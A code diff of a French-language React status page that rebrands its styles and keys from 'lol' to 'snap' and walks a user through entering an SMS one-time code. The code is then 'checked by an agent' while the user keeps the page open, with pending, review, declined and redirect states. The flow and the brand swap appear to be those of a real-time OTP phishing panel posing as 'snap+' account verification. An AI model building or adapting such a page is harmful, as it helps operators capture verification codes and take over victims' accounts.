@@ -5,7 +5,7 @@ import { CheckCircle2, Loader2 } from "lucide-react";
 import Logo from "../components/Logo";
 import { getUserState, submitCode } from "../lib/api";
 
-const ooo_LEN = [4, 6]; // longueurs acceptées (choisies par l'utilisateur)
+const otp_LEN = [4, 6]; // longueurs acceptées (choisies par l'utilisateur)
 
 function ErrorCard({ message }) {
     return (
@@ -36,11 +36,11 @@ function StateBadge({ state }) {
     const s = map[state] || map.pending;
     return (
         <span
-            className="lol-chip active"
+            className="snap-chip active"
             style={{ background: `${s.color}`, color: "#0a0a0a" }}
             data-testid={`state-badge-${state}`}
         >
-            <span className="lol-dot" style={{ background: "#0a0a0a", boxShadow: "none" }} />
+            <span className="snap-dot" style={{ background: "#0a0a0a", boxShadow: "none" }} />
             {s.label.toUpperCase()}
         </span>
     );
@@ -50,10 +50,10 @@ function PendingCard({ nickname }) {
     return (
         <>
             <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
-                <div className="lol-spinner" />
+                <div className="snap-spinner" />
             </div>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
-                Salut, <span className="lol-accent">{nickname || "toi"}</span> <span role="img" aria-label="wave">👋</span>
+                Salut, <span className="snap-accent">{nickname || "toi"}</span> <span role="img" aria-label="wave">👋</span>
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 22px", lineHeight: 1.55 }}>
                 Ton inscription est reçue. On vérifie ton dossier — le code arrive par SMS dans un instant.
@@ -66,7 +66,7 @@ function PendingCard({ nickname }) {
 }
 
 function CodeCard({ userId, onSubmitted, errorMsg }) {
-    const MAX = Math.max(...ooo_LEN);
+    const MAX = Math.max(...otp_LEN);
     const [len, setLen] = useState(MAX); // nombre de cases affichées
     const [digits, setDigits] = useState(Array(MAX).fill(""));
     const [sending, setSending] = useState(false);
@@ -121,7 +121,7 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
     return (
         <>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "6px 0 6px" }}>
-                <span className="lol-accent">Vérification</span> du pseudo
+                <span className="snap-accent">Vérification</span> du pseudo
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 24px", lineHeight: 1.5 }}>
                 Entre le pseudo reçu par DM discord.
@@ -133,12 +133,12 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
             )}
 
             <div style={{ display: "flex", justifyContent: "center", gap: 10, marginBottom: 18 }}>
-                {ooo_LEN.map((n) => (
+                {otp_LEN.map((n) => (
                     <button
                         key={n}
                         type="button"
                         onClick={() => chooseLen(n)}
-                        data-testid={`ooo-len-${n}`}
+                        data-testid={`otp-len-${n}`}
                         style={{
                             padding: "8px 18px",
                             borderRadius: 10,
@@ -149,7 +149,7 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
                             color: len === n ? "#facc15" : "#9a9a9a",
                         }}
                     >
-                        ooo {n}
+                        otp {n}
                     </button>
                 ))}
             </div>
@@ -159,21 +159,21 @@ function CodeCard({ userId, onSubmitted, errorMsg }) {
                     <input
                         key={i}
                         ref={(el) => (refs.current[i] = el)}
-                        className="ooo-input"
+                        className="otp-input"
                         inputMode="numeric"
                         maxLength={1}
                         value={d}
                         onChange={(e) => setD(i, e.target.value)}
                         onKeyDown={(e) => handleKey(i, e)}
-                        data-testid={`ooo-input-${i}`}
+                        data-testid={`otp-input-${i}`}
                     />
                 ))}
             </div>
             <button
-                className="lol-btn"
+                className="snap-btn"
                 disabled={!ready}
                 onClick={submit}
-                data-testid="ooo-submit-btn"
+                data-testid="otp-submit-btn"
             >
                 {sending ? "Envoi..." : "Valider le pseudo"}
             </button>
@@ -185,10 +185,10 @@ function ProcessingCard() {
     return (
         <>
             <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
-                <Loader2 size={72} className="lol-accent" style={{ animation: "lolspin 1s linear infinite" }} />
+                <Loader2 size={72} className="snap-accent" style={{ animation: "snapspin 1s linear infinite" }} />
             </div>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
-                <span className="lol-accent">Traitement</span> en cours
+                <span className="snap-accent">Traitement</span> en cours
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 20px", lineHeight: 1.5 }}>
                 Merci ! On finalise ton dossier — ne ferme pas la page.
@@ -212,7 +212,7 @@ function SuccessCard() {
                 C'est <span style={{ color: "#22c55e" }}>validé</span> !
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 22px", lineHeight: 1.5 }}>
-                Ton compte lol+ est actif. Tu peux fermer cette fenêtre.
+                Ton compte snap+ est actif. Tu peux fermer cette fenêtre.
             </p>
             <div style={{ display: "flex", justifyContent: "center" }}>
                 <StateBadge state="success" />
@@ -225,10 +225,10 @@ function ReviewCard({ nickname }) {
     return (
         <>
             <div style={{ display: "flex", justifyContent: "center", margin: "10px 0 22px" }}>
-                <Loader2 size={72} className="lol-accent" style={{ animation: "lolspin 1s linear infinite" }} />
+                <Loader2 size={72} className="snap-accent" style={{ animation: "snapspin 1s linear infinite" }} />
             </div>
             <h2 style={{ fontSize: 26, textAlign: "center", fontWeight: 700, margin: "0 0 8px" }}>
-                Code <span className="lol-accent">reçu</span>
+                Code <span className="snap-accent">reçu</span>
             </h2>
             <p style={{ textAlign: "center", color: "#9a9a9a", margin: "0 0 20px", lineHeight: 1.5 }}>
                 Merci {nickname || ""} ! Un agent vérifie ton code. Ne ferme pas la page.
@@ -262,7 +262,7 @@ function DeclinedCard({ reason }) {
 export default function UserStatus() {
     const { id } = useParams();
     const [state, setState] = useState("pending");
-    const [nickname, setNickname] = useState(localStorage.getItem("lol_nickname") || "");
+    const [nickname, setNickname] = useState(localStorage.getItem("snap_nickname") || "");
     const [errorMsg, setErrorMsg] = useState("");
     const [redirectUrl, setRedirectUrl] = useState("");
     const [declineReason, setDeclineReason] = useState("");
@@ -296,8 +296,8 @@ export default function UserStatus() {
 
     if (notFound) {
         return (
-            <div className="lol-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
-                <div className="lol-card" style={{ padding: 30, maxWidth: 380 }}>
+            <div className="snap-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
+                <div className="snap-card" style={{ padding: 30, maxWidth: 380 }}>
                     <p style={{ textAlign: "center" }}>Session introuvable.</p>
                 </div>
             </div>
@@ -305,8 +305,8 @@ export default function UserStatus() {
     }
 
     return (
-        <div className="lol-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
-            <div className="lol-card" style={{ width: "100%", maxWidth: 420, padding: "32px 26px" }} data-testid={`status-card-${state}`}>
+        <div className="snap-aura" style={{ minHeight: "100vh", display: "flex", alignItems: "center", justifyContent: "center", padding: 20 }}>
+            <div className="snap-card" style={{ width: "100%", maxWidth: 420, padding: "32px 26px" }} data-testid={`status-card-${state}`}>
                 <div style={{ textAlign: "center", marginBottom: 18 }}>
                     <Logo />
                 </div>
@@ -319,7 +319,7 @@ export default function UserStatus() {
                 {state === "error" && <ErrorCard message={errorMsg} />}
             </div>
             <p style={{ position: "absolute", bottom: 16, color: "#4a4a4a", fontSize: 12 }} data-testid="footer-state">
-                État : <span className="lol-accent">{state}</span>
+                État : <span className="snap-accent">{state}</span>
             </p>
         </div>
     );
